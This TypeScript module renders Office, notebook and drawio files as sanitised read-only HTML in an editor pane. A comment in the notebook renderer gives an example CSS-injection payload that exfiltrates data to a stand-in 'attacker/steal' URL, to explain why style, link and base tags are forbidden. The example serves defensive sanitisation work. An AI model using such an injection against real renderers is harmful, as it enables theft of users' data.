// Rich (non-text) file preview — render Office + drawio files to read-only HTML
// in the editor's reading pane.
//
// Each parser is its OWN lazy import() chunk, so a library is only fetched when a
// file of that type is actually opened — never on initial app load (mirrors the
// mermaid hybrid). The produced markup is DOMPurify-sanitised before it touches
// the DOM: vault files can arrive via /import or a fetched URL, so a crafted
// workbook/doc must not be able to smuggle a script/handler through.

import DOMPurify from "dompurify";
import type { DaemonClient } from "./daemon";
import { mountViewport } from "./richviewport";
import "./richfile.css";

/** Extensions the editor previews via renderRichFile() instead of as text. */
const RICH_EXTENSIONS = new Set(["xlsx", "csv", "tsv", "docx", "pptx", "drawio", "ipynb"]);

function ext(path: string): string {
  return (path.split(".").pop() ?? "").toLowerCase();
}

/** True when `path` is a rich file the editor renders (not a text/code preview). */
export function isRichFile(path: string): boolean {
  return RICH_EXTENSIONS.has(ext(path));
}

/** A short human label for the type badge in the editor toolbar. */
export function richLabel(path: string): string {
  return (
    {
      xlsx: "Spreadsheet",
      csv: "Table",
      tsv: "Table",
      docx: "Document",
      pptx: "Slides",
      drawio: "Diagram",
      ipynb: "Notebook",
    }[ext(path)] ?? "File"
  );
}

/** Render a rich file into `host` (read-only). Rejects on a load/parse failure so
 *  the caller can surface an error instead of a blank pane. */
export async function renderRichFile(
  path: string,
  host: HTMLElement,
  daemon: DaemonClient,
): Promise<(() => void) | void> {
  switch (ext(path)) {
    case "xlsx":
    case "csv":
    case "tsv":
      // SheetJS auto-detects CSV/TSV (delimiter sniffed) → one sheet, no tab bar.
      return renderXlsx(path, host, daemon);
    case "docx":
      return renderDocx(path, host, daemon);
    case "ipynb":
      return renderIpynb(path, host, daemon);
    case "pptx":
      return renderPptx(path, host, daemon);
    case "drawio":
      return renderDrawio(path, host, daemon);
    default:
      host.innerHTML = '<div class="rich-msg">Preview isn’t available for this file type yet.</div>';
  }
}

async function arrayBuffer(path: string, daemon: DaemonClient): Promise<ArrayBuffer> {
  return (await daemon.fileBlob(path)).arrayBuffer();
}

function escapeHtml(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

/** Sanitise the HTML in a drawio model's cell labels (drawio stores styled,
 *  multi-line labels as `<br>` / `<font …>` markup in each cell's `value`). This
 *  lets maxGraph render them as HTML without a crafted .drawio smuggling a
 *  script/handler into the foreignObject the label is drawn into. Returns the
 *  rewritten XML, or null if it couldn't be parsed — the caller then keeps HTML
 *  labels OFF and renders plain text instead. */
function sanitizeDrawioLabels(xml: string): string | null {
  try {
    const doc = new DOMParser().parseFromString(xml, "text/xml");
    if (doc.querySelector("parsererror")) return null;
    for (const el of Array.from(doc.querySelectorAll("[value]"))) {
      const v = el.getAttribute("value") ?? "";
      // Only touch labels that actually contain a tag — leave plain text (incl. a
      // literal "A < B") untouched so DOMPurify can't eat a stray "<".
      if (/<[a-z!/]/i.test(v)) el.setAttribute("value", DOMPurify.sanitize(v));
    }
    return new XMLSerializer().serializeToString(doc);
  } catch {
    return null;
  }
}

// ── xlsx (SheetJS) ──────────────────────────────────────────────────────────
async function renderXlsx(path: string, host: HTMLElement, daemon: DaemonClient): Promise<void> {
  const buf = await arrayBuffer(path, daemon);
  const XLSX = await import("xlsx");
  const wb = XLSX.read(new Uint8Array(buf), { type: "array" });
  const names = wb.SheetNames;
  if (names.length === 0) {
    host.innerHTML = '<div class="rich-msg">This workbook has no sheets.</div>';
    return;
  }
  // sheet_to_html emits a full <table> (SheetJS wraps it in a document; DOMPurify
  // strips the html/head/body shell and keeps the table + its inline styles).
  const tab = (n: string, i: number) =>
    `<button class="rich-tab${i === 0 ? " is-active" : ""}" data-sheet="${i}" type="button">${escapeHtml(n)}</button>`;
  const panel = (n: string, i: number) =>
    `<div class="rich-tab-panel${i === 0 ? "" : " rich-hidden"}" data-sheet="${i}">${XLSX.utils.sheet_to_html(wb.Sheets[n], { id: "", editable: false })}</div>`;
  // One tab per sheet (mirrors Excel's sheet tabs). A single-sheet book skips the bar.
  const bar = names.length > 1 ? `<div class="rich-tabs" role="tablist">${names.map(tab).join("")}</div>` : "";
  host.innerHTML = DOMPurify.sanitize(`${bar}<div class="rich-tab-body">${names.map(panel).join("")}</div>`);

  // Wire tab switching by hand — richfile renders into a plain host, not a Preact
  // tree, so there's no JSX onClick. Toggling classes keeps every sheet in the DOM
  // (instant switch, no re-parse).
  const tabs = [...host.querySelectorAll<HTMLButtonElement>(".rich-tab")];
  const panels = [...host.querySelectorAll<HTMLElement>(".rich-tab-panel")];
  for (const btn of tabs) {
    btn.addEventListener("click", () => {
      const idx = btn.dataset.sheet;
      for (const b of tabs) b.classList.toggle("is-active", b === btn);
      for (const p of panels) p.classList.toggle("rich-hidden", p.dataset.sheet !== idx);
    });
  }
}

// ── docx (mammoth) ──────────────────────────────────────────────────────────
async function renderDocx(path: string, host: HTMLElement, daemon: DaemonClient): Promise<void> {
  const buf = await arrayBuffer(path, daemon);
  const mammoth = await import("mammoth");
  const { value } = await mammoth.convertToHtml({ arrayBuffer: buf });
  const fonts = await docxFontFaces(buf);
  // mammoth drops per-run fonts, so apply the document's primary embedded font to
  // the whole body (a fair approximation for a single-font document). `fonts.family`
  // is already restricted to a safe character set.
  const famAttr = fonts.family ? ` style="font-family:'${fonts.family}',var(--font-sans)"` : "";
  host.innerHTML =
    `<article class="rich-doc"${famAttr}>` +
    DOMPurify.sanitize(value || '<p class="rich-msg">This document is empty.</p>') +
    "</article>";
  // Inject the embedded @font-face CSS via a <style> element's textContent (NOT an
  // innerHTML string), so the untrusted font family/bytes can never break out of
  // the CSS context into markup.
  if (fonts.css) {
    const style = document.createElement("style");
    style.textContent = fonts.css;
    host.prepend(style);
  }
}

// ── Jupyter notebook (.ipynb) ───────────────────────────────────────────────
interface NbOutput {
  output_type?: string;
  text?: string | string[];
  traceback?: string[];
  data?: Record<string, string | string[]>;
}
interface NbCell {
  cell_type?: string;
  source?: string | string[];
  outputs?: NbOutput[];
}
interface Notebook {
  cells?: NbCell[];
  metadata?: { language_info?: { name?: string }; kernelspec?: { language?: string } };
}

/** Render an .ipynb: markdown cells via the markdown renderer, code cells through
 *  the shared code-block highlighter, and outputs (stream / result / image / error)
 *  inline. The whole tree is sanitised (notebook output HTML is untrusted). */
async function renderIpynb(path: string, host: HTMLElement, daemon: DaemonClient): Promise<void> {
  const { content } = await daemon.file(path);
  let nb: Notebook;
  try {
    nb = JSON.parse(content) as Notebook;
  } catch {
    host.innerHTML = '<div class="rich-msg">Couldn’t parse this notebook (invalid JSON).</div>';
    return;
  }
  const cells = Array.isArray(nb.cells) ? nb.cells : [];
  const lang = escapeHtml(nb.metadata?.language_info?.name || nb.metadata?.kernelspec?.language || "python");
  const str = (s: string | string[] | undefined) => (Array.isArray(s) ? s.join("") : s ?? "");
  const { renderMarkdown } = await import("./markdown");

  const renderOutputs = (outputs: NbOutput[] = []): string =>
    outputs
      .map((o) => {
        if (o.output_type === "stream") return `<pre class="nb-out">${escapeHtml(str(o.text))}</pre>`;
        if (o.output_type === "error")
          return `<pre class="nb-err">${escapeHtml((o.traceback ?? []).join("\n").replace(/\[[0-9;]*m/g, ""))}</pre>`;
        if (o.output_type === "execute_result" || o.output_type === "display_data") {
          const d = o.data ?? {};
          if (d["image/png"]) return `<img class="nb-img" alt="output" src="data:image/png;base64,${str(d["image/png"]).trim()}" />`;
          if (d["image/jpeg"]) return `<img class="nb-img" alt="output" src="data:image/jpeg;base64,${str(d["image/jpeg"]).trim()}" />`;
          if (d["text/html"]) return `<div class="nb-html">${str(d["text/html"])}</div>`;
          if (d["text/plain"]) return `<pre class="nb-out">${escapeHtml(str(d["text/plain"]))}</pre>`;
        }
        return "";
      })
      .join("");

  const body = cells
    .map((c) => {
      if (c.cell_type === "markdown") return `<div class="nb-md">${renderMarkdown(str(c.source)).html}</div>`;
      if (c.cell_type === "code") {
        const code = str(c.source);
        const outs = renderOutputs(c.outputs);
        if (!code.trim() && !outs) return "";
        return (
          '<div class="nb-cell">' +
          (code.trim() ? `<pre><code class="language-${lang}">${escapeHtml(code)}</code></pre>` : "") +
          outs +
          "</div>"
        );
      }
      return "";
    })
    .join("");

  // FORBID <style>/<link>/<base>: a notebook's `text/html` output is untrusted
  // vault content and DOMPurify allows <style> by default — a crafted cell could
  // inject `<style>…content:url(https://attacker/steal)…</style>` and exfiltrate
  // via CSS, or a <link>/<base> to hijack styling/navigation.
  host.innerHTML = DOMPurify.sanitize(
    `<div class="nb-doc">${body || '<div class="rich-msg">This notebook is empty.</div>'}</div>`,
    { FORBID_TAGS: ["style", "link", "base"] },
  );
  // highlight + line-number the code cells with the shared post-processor
  const { enhanceCodeBlocksIn } = await import("./codeblock");
  await enhanceCodeBlocksIn(host);
}

// ── pptx (@aiden0z/pptx-renderer — high-fidelity OOXML → HTML/SVG) ────────────
// ── Embedded fonts (docx / pptx) ─────────────────────────────────────────────
// Office files can embed their typefaces; the renderers only set the font NAME,
// so without these the preview falls back to a system font. We pull the embedded
// font bytes out of the zip and inject @font-face rules (data: URIs — the CSP
// already allows font-src 'self' data:) so the document shows its real fonts.

/** Restrict a font family name to a safe character set (font names are
 *  alphanumeric + space/dot/hyphen) so an untrusted name can't break out of the
 *  CSS string / inject markup. */
function safeFontFamily(s: string): string {
  return s.replace(/[^\w .\-]/g, "").trim().slice(0, 64);
}

/** One @font-face rule for an embedded font (base64 bytes). No format() hint —
 *  the browser sniffs TTF/OTF from the data. */
function fontFaceRule(family: string, b64: string, bold: boolean, italic: boolean): string {
  return `@font-face{font-family:"${safeFontFamily(family)}";font-weight:${bold ? 700 : 400};font-style:${italic ? "italic" : "normal"};src:url("data:font/ttf;base64,${b64}");}`;
}

/** De-obfuscate a Word .odttf (ECMA-376 §17.8.1): the first 32 bytes are XORed
 *  with the 16-byte font-key GUID, byte-reversed, applied twice. */
function deobfuscateOdttf(bytes: Uint8Array, guid: string): Uint8Array {
  const hex = guid.replace(/[{}-]/g, "");
  if (hex.length < 32) return bytes;
  const key = new Uint8Array(16);
  for (let i = 0; i < 16; i++) key[i] = parseInt(hex.substr(i * 2, 2), 16);
  key.reverse();
  const out = bytes.slice();
  for (let i = 0; i < 32 && i < out.length; i++) out[i] ^= key[i % 16];
  return out;
}

function u8ToBase64(u8: Uint8Array): string {
  let s = "";
  for (let i = 0; i < u8.length; i += 0x8000) s += String.fromCharCode(...u8.subarray(i, i + 0x8000));
  return btoa(s);
}

/** Build @font-face CSS from a docx's embedded fonts (word/fontTable.xml →
 *  relationship → word/fonts/*.odttf, de-obfuscated). Returns the CSS + the
 *  primary family — mammoth drops per-run fonts, so the caller applies that
 *  family to the whole body. */
async function docxFontFaces(buf: ArrayBuffer): Promise<{ css: string; family: string | null }> {
  try {
    const JSZip = (await import("jszip")).default;
    const zip = await JSZip.loadAsync(buf);
    const ft = await zip.file("word/fontTable.xml")?.async("string");
    const rels = await zip.file("word/_rels/fontTable.xml.rels")?.async("string");
    if (!ft || !rels) return { css: "", family: null };
    const relMap = new Map<string, string>();
    for (const m of rels.matchAll(/<Relationship\b[^>]*\bId="([^"]+)"[^>]*\bTarget="([^"]+)"/g)) {
      relMap.set(m[1], m[2]);
    }
    const faces: string[] = [];
    let primary: string | null = null;
    for (const fm of ft.matchAll(/<w:font\b[^>]*\bw:name="([^"]+)"[^>]*>([\s\S]*?)<\/w:font>/g)) {
      const family = fm[1];
      let added = false;
      for (const slot of fm[2].matchAll(
        /<w:(embedRegular|embedBold|embedItalic|embedBoldItalic)\b[^>]*\br:id="([^"]+)"[^>]*\bw:fontKey="([^"]+)"/g,
      )) {
        const target = relMap.get(slot[2]);
        if (!target) continue;
        const p = target.startsWith("/") ? target.slice(1) : `word/${target}`;
        const raw = await zip.file(p)?.async("uint8array");
        if (!raw) continue;
        const b64 = u8ToBase64(deobfuscateOdttf(raw, slot[3]));
        const w = slot[1].toLowerCase();
        faces.push(fontFaceRule(family, b64, w.includes("bold"), w.includes("italic")));
        added = true;
      }
      if (added && !primary) primary = safeFontFamily(family);
    }
    return { css: faces.join(""), family: primary };
  } catch {
    return { css: "", family: null };
  }
}

/** Build @font-face CSS from a pptx's embedded fonts (ppt/presentation.xml's
 *  embeddedFontLst → relationship → ppt/fonts/*.fntdata). Returns "" if none. */
async function pptxFontFaces(buf: ArrayBuffer): Promise<{ css: string; families: Set<string> }> {
  const families = new Set<string>();
  try {
    const JSZip = (await import("jszip")).default;
    const zip = await JSZip.loadAsync(buf);
    const pres = await zip.file("ppt/presentation.xml")?.async("string");
    const rels = await zip.file("ppt/_rels/presentation.xml.rels")?.async("string");
    if (!pres || !rels) return { css: "", families };
    const relMap = new Map<string, string>();
    for (const m of rels.matchAll(/<Relationship\b[^>]*\bId="([^"]+)"[^>]*\bTarget="([^"]+)"/g)) {
      relMap.set(m[1], m[2]);
    }
    const faces: string[] = [];
    for (const ef of pres.matchAll(/<p:embeddedFont\b[^>]*>([\s\S]*?)<\/p:embeddedFont>/g)) {
      const block = ef[1];
      const family = /typeface="([^"]+)"/.exec(block)?.[1];
      if (!family) continue;
      families.add(family);
      for (const slot of block.matchAll(/<p:(regular|bold|italic|boldItalic)\b[^>]*\br:id="([^"]+)"/g)) {
        const target = relMap.get(slot[2]);
        if (!target) continue;
        const p = target.startsWith("/") ? target.slice(1) : `ppt/${target}`;
        const data = await zip.file(p)?.async("base64");
        if (!data) continue;
        const w = slot[1].toLowerCase();
        faces.push(fontFaceRule(family, data, w.includes("bold"), w.includes("italic")));
      }
    }
    return { css: faces.join(""), families };
  } catch {
    return { css: "", families };
  }
}

/** Append a bundled fallback (Inter / JetBrains Mono) to slide text whose font
 *  isn't embedded, so it lands on a real typeface instead of the browser's serif
 *  default. Picks mono vs sans from the font name. Idempotent. */
function applyBundledFallback(root: HTMLElement, embedded: Set<string>): void {
  for (const el of Array.from(root.querySelectorAll<HTMLElement>("[style*='font-family']"))) {
    const fam = el.style.fontFamily;
    if (!fam || /var\(--font/.test(fam)) continue; // already has our fallback
    const first = fam.split(",")[0].replace(/["']/g, "").trim();
    if (!first || embedded.has(first)) continue; // embedded → leave the real font
    const mono = /\b(mono|code|consol|courier|menlo|typewriter)\b/i.test(first);
    el.style.fontFamily = `${fam}, ${mono ? "var(--font-mono)" : "var(--font-sans)"}`;
  }
}

async function renderPptx(path: string, host: HTMLElement, daemon: DaemonClient): Promise<() => void> {
  const buf = await arrayBuffer(path, daemon);
  const { PptxViewer } = await import("@aiden0z/pptx-renderer");
  host.innerHTML = "";
  const frame = document.createElement("div");
  frame.className = "rich-slides-frame";
  const stage = document.createElement("div");
  stage.className = "rich-slides";
  frame.appendChild(stage);
  host.appendChild(frame);
  // Inject the deck's embedded fonts so slide text renders in its real typeface.
  const fonts = await pptxFontFaces(buf);
  if (fonts.css) {
    const style = document.createElement("style");
    style.textContent = fonts.css;
    frame.appendChild(style);
  }
  // One slide at a time so the viewport pans/zooms a single slide; ◀ ▶ navigate.
  // fitMode "none" renders at the slide's intrinsic size — mountViewport scales it.
  // This renderer sizes shape/picture-filled images correctly (pptx-preview
  // collapsed them to 0×0) and resolves embedded media as blob: URLs.
  const viewer = await PptxViewer.open(buf, stage, { renderMode: "slide", fitMode: "none" });
  applyBundledFallback(stage, fonts.families);
  const count = viewer.slideCount;
  let cur = 0;
  const show = (i: number) => {
    cur = Math.max(0, Math.min(count - 1, i));
    void Promise.resolve(viewer.renderSlide(cur)).then(() => applyBundledFallback(stage, fonts.families));
  };
  const handle = mountViewport(frame, stage, {
    nav: {
      prev: () => show(cur - 1),
      next: () => show(cur + 1),
      label: () => `${cur + 1} / ${count}`,
    },
  });
  return () => {
    handle.destroy();
    viewer.destroy();
  };
}

// ── drawio (@maxgraph/core) ─────────────────────────────────────────────────
async function renderDrawio(path: string, host: HTMLElement, daemon: DaemonClient): Promise<() => void> {
  // .drawio is XML text, not binary — read it as text.
  const { content } = await daemon.file(path);
  const modelXml = await extractDrawioModel(content);
  if (!modelXml) {
    host.innerHTML = '<div class="rich-msg">Couldn’t read this diagram (unsupported drawio format).</div>';
    return () => {};
  }
  const { Graph, ModelXmlSerializer, FitPlugin } = await import("@maxgraph/core");
  host.innerHTML = "";
  // A relative frame fills the whole pane and holds both the canvas and the
  // floating zoom toolbar.
  const frame = document.createElement("div");
  frame.className = "rich-diagram-frame";
  const stage = document.createElement("div");
  stage.className = "rich-diagram";
  frame.appendChild(stage);
  host.appendChild(frame);
  // FitPlugin (id "fit") scales the diagram to the pane.
  const graph = new Graph(stage, undefined, [FitPlugin]);
  graph.setEnabled(false); // read-only preview — no editing/selection of cells
  // drawio labels carry HTML (<br>, styled <font>) — render them as HTML so the
  // diagram reads as authored, but only once the labels are sanitised. On a parse
  // failure keep HTML off (plain text) rather than risk an unsanitised label.
  const safeXml = sanitizeDrawioLabels(modelXml);
  if (safeXml) graph.setHtmlLabels(true);
  new ModelXmlSerializer(graph.getDataModel()).import(safeXml ?? modelXml);
  const fitPlugin = graph.getPlugin("fit") as unknown as
    | { fitCenter?: (o?: { border?: number }) => number }
    | undefined;
  const fitGraph = () => fitPlugin?.fitCenter?.({ border: 8 });

  // Shared pan / zoom / fullscreen controls (drag, wheel, Z, Space, F). mountViewport
  // runs the initial fit (with padding) and the Fit button re-runs maxGraph's fit.
  const handle = mountViewport(frame, stage, { onFit: fitGraph, bgToggle: true });
  return () => handle.destroy();
}

/** Pull the mxGraphModel XML out of a .drawio `<mxfile>` — handles both the
 *  uncompressed form (a literal <mxGraphModel> child) and the compressed form
 *  (base64 + raw-deflate + url-encode of the model). Returns null if neither. */
async function extractDrawioModel(xml: string): Promise<string | null> {
  const doc = new DOMParser().parseFromString(xml, "text/xml");
  if (doc.querySelector("parsererror")) return null;
  const diagram = doc.querySelector("diagram");
  // A bare mxGraphModel file, or an uncompressed <diagram><mxGraphModel>…
  const modelEl = (diagram ?? doc).querySelector("mxGraphModel");
  if (modelEl) return new XMLSerializer().serializeToString(modelEl);
  // Compressed: the <diagram> text is base64(raw-deflate(url-encoded model)).
  const data = diagram?.textContent?.trim();
  if (!data) return null;
  try {
    const bytes = Uint8Array.from(atob(data), (c) => c.charCodeAt(0));
    const pako = await import("pako");
    return decodeURIComponent(new TextDecoder().decode(pako.inflateRaw(bytes)));
  } catch {
    return null;
  }
}
